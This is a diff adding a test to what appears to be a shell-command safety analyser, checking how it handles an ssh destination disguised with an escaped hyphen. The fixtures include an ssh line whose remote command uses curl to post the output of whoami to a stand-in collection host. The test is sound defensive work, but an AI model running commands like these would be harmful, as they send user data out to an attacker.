@@ -2151,6 +2151,36 @@ describe('mapVerdictToAction — §4.6 floors an open-world command even when th
   });
 
   /**
+   * **The case a MUTATION found, and it is the only one where the destination test does its own
+   * work.** `findFlow` skips a part with no supported host at all, so on every case above the
+   * destination test in `remoteCommandOperands` is never reached — replacing it with the unmarked
+   * host set changed nothing and no test noticed.
+   *
+   * Here the part carries BOTH: an undeterminable token in the destination position AND an ordinary
+   * URL further along, which is a real shape (an ssh line whose remote command posts somewhere). The
+   * loop guard lets the part through on the second host, and only the destination test stops the
+   * sentence claiming that ssh runs a command ON the first — a host the shell hands over as a flag.
+   *
+   * The second row is the discriminating half: the same line with the expansion removed still gets
+   * its sentence, so this pins the test rather than the decline.
+   */
+  it('does not take an undeterminable destination just because the part names another host', () => {
+    const spoofed = String.raw`ssh $'\x2d'deploy@evil.example.net curl -d "$(whoami)" https://collect.example.net/u`;
+    const plain = 'ssh deploy@evil.example.net curl -d "$(whoami)" https://collect.example.net/u';
+
+    const finding = findComposedOpenWorld(spoofed);
+    // The premise: the part really does carry a SUPPORTED host as well, so `findFlow` reaches the
+    // destination test instead of skipping the part.
+    expect(finding?.hosts).toHaveLength(2);
+    expect(finding?.unsupportedHosts).toEqual(['$x2ddeploy@evil.example.net']);
+    expect(finding?.flow).toBeNull();
+    expect(buildComposedOpenWorldNote(spoofed) ?? '').not.toContain('runs ON');
+
+    expect(findComposedOpenWorld(plain)?.flow?.kind).toBe('remote-command');
+    expect(findComposedOpenWorld(plain)?.flow?.destination).toBe('deploy@evil.example.net');
+  });
+
+  /**
    * **Half 1 — the raw pass, across the three heads the node names.** `ssh`, `curl` and `scp` all
    * take a `user@host` operand, so this was never an ssh problem: it is host provenance on the raw
    * pass, and each of these lines used to state a mechanism (a fetch, a send) that cannot happen
